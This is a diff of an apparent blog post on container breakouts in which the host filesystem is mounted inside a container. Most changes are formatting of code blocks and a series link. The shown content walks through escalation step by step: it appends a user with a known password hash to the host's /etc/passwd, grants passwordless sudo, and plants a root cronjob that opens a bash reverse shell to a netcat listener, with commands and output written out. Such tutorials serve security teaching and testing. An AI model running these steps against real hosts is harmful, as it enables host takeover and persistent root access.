@@ -15,14 +15,7 @@ This post is part of a series and shows container breakout techniques that can b
 The following posts are part of the series:
 - Part 1: Access to root directory of the Host
 - [Part 2: Privileged Container](../container-breakouts-part2)
-- Part 3: Docker Socket (not yet published)
-
-<!--
-The following posts are part of the series:
-- Part 1: Access to root directory of the Host
-- [Part 2: Privileged Container](../container-breakouts-part2)
 - [Part 3: Docker Socket](../container-breakouts-part3)
--->
 
 
 ## Intro
@@ -48,22 +41,22 @@ To escalate to the host, we **create a user** in the file `/hostfs/etc/passwd` a
 Here are all steps that must be performed (we start in the container).
 
 
-```
-# cat /hostfs/etc/passwd | grep 1000
+```bash
+~# cat /hostfs/etc/passwd | grep 1000
 user:x:1000:1001:user:/home/user:/usr/bin/zsh
 
-# openssl passwd -6 -salt xyz test
+~# openssl passwd -6 -salt xyz test
 $6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0
 
-# echo 'foo:$6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0:1000:1001:user:/home/user:/usr/bin/zsh' | tee -a /hostfs/etc/passwd
+~# echo 'foo:$6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0:1000:1001:user:/home/user:/usr/bin/zsh' | tee -a /hostfs/etc/passwd
 
-# echo "user ALL=(ALL) NOPASSWD: ALL" >> /hostfs/etc/sudoers.d/0-user
+~# echo "user ALL=(ALL) NOPASSWD: ALL" >> /hostfs/etc/sudoers.d/0-user
 
-# ip r
+~# ip r
 default via 172.17.0.1 dev eth0 
 172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.2 
 
-# ssh -l foo 172.17.0.1
+~# ssh -l foo 172.17.0.1
 The authenticity of host '172.17.0.1 (172.17.0.1)' can't be established.
 ECDSA key fingerprint is SHA256:PezvADaTYqKcp4JfDO1bapTJaMEAVBjCXCCzanBZOW8.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -84,7 +77,7 @@ For this scenario, the SSH daemon is running on the host, the configuration is n
 
 Because in a default setup the container is **direct connected to the host**, we can initiate not only connections from the container to the host, also vice-versa. To do so, we need the IP address from the container. Depending on the binaries that are available on the host, we initiate a **reverse shell by** a **cronjob** that connects to an exposed port on the container. In this showcase, we use `bash` for the reverse connection and `netcat` to handle the connection in the container. The following line is all we need:
 
-```
+```bash
 * * * * * root bash -i >& /dev/tcp/$CONTAINER_IP/$CONTAINER_PORT 0>&1
 ```
 
@@ -92,16 +85,16 @@ The **cronjob** is executed **every minute** as user `root` on the host. So, as 
 
 Here are all steps that must be performed (we start in the container).
 
-```
-# ip a
+```bash
+~# ip a
 […]
 6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
     link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
     inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
 […]
 
-# echo "* * * * * root bash -i >& /dev/tcp/172.17.0.2/1337 0>&1" | tee /hostfs/etc/cron.d/1revers
-# nc -lkvp 1337
+~# echo "* * * * * root bash -i >& /dev/tcp/172.17.0.2/1337 0>&1" | tee /hostfs/etc/cron.d/1revers
+~# nc -lkvp 1337
 nc -lvkp 1337
 listening on [any] 1337 ...
 172.17.0.1: inverse host lookup failed: Unknown host
